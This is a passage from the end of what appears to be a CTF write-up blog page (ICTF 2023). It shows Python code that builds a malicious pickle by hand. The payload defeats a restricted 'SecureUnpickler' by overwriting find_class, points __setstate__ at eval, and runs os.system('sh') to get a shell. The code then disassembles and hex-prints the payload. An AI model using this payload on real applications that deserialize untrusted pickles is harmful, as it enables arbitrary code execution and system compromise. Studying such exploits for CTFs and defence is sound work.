</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">POP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">GLOBAL</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;__main__</span><span class="se">\n</span><span class="s2">__main__</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">MARK</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">STRING</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&#39;__main__&#39;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">GLOBAL</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;__main__</span><span class="se">\n</span><span class="s2">__builtins__</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">DICT</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BUILD</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">GLOBAL</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;__main__</span><span class="se">\n</span><span class="s2">get</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BINPUT</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">3</span><span class="p">])</span> <span class="c1"># save get to memo[3]</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">POP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SecureUnpickler.find_class = __builtins__.get</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BINGET</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">2</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">NONE</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">MARK</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">STRING</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&#39;find_class&#39;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BINGET</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">3</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">DICT</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">TUPLE2</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BUILD</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># __main__.__setstate__ = __builtins__.eval</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BINGET</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">NONE</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">MARK</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">STRING</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&#39;__setstate__&#39;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">GLOBAL</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;eval</span><span class="se">\n</span><span class="s2">aaa</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">DICT</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">TUPLE2</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BUILD</span> 
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">POP</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">POP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># trigger eval(&#34;&#39;__import__(\&#34;os\&#34;).system(\&#34;sh\&#34;)&#39;\n&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BINGET</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">STRING</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&#39;__import__(</span><span class="se">\&#34;</span><span class="s2">os</span><span class="se">\&#34;</span><span class="s2">).system(</span><span class="se">\&#34;</span><span class="s2">sh</span><span class="se">\&#34;</span><span class="s2">)&#39;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">BUILD</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">POP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">+=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">STOP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">codecs</span> <span class="kn">import</span> <span class="n">getencoder</span>
</span></span><span class="line"><span class="cl"><span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">getencoder</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)(</span><span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></div>
          
          
          
        </div>
        
        

        
        

        


  
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_posts\/ICTF-2023\/index.md"
        var oid_likes = "likes_posts\/ICTF-2023\/index.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.4c1d8e0f53a5b5b7bccae87750581a0a393723aae9a9ae5622497d488b9689a4fd64a34846876e449a065aed64df10f9219b8df359a87371b998dd8bf58a1da5.js" integrity="sha512-TB2OD1Oltbe8yuh3UFgaCjk3I6rpqa5WIkl9SIuWiaT9ZKNIRoduRJoGWu1k3xD5IZuN81moc3G5mN2L9YodpQ=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/pwnablevn/writeup/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  ></span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="0001-01-01T00:00:00&#43;00:00">1 January 0001</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/imaginaryctf-2024/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >ImaginaryCTF 2024</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-04-27T00:00:00&#43;00:00">27 April 2024</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex flex-col list-none sm:flex-row">
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
            title="Tags">
            
            tags
          </a>
        </li>
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
            title="Categories">
            
            categories
          </a>
        </li>
        
      </ul>
    </nav>
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      Copyright © Shin24
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.330c9c7ed3478d29ddc83242e05f3636088799f250f724e0eee3b88057e4e288861cf148972d2ac1ed5972c27193c1c919d768bf5e52f6ef01d3abc3b16df7c2.js" integrity="sha512-MwycftNHjSndyDJC4F82NgiHmfJQ9yTg7uO4gFfk4oiGHPFIly0qwe1ZcsJxk8HJGddov15S9u8B06vDsW33wg=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="//localhost:1313/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
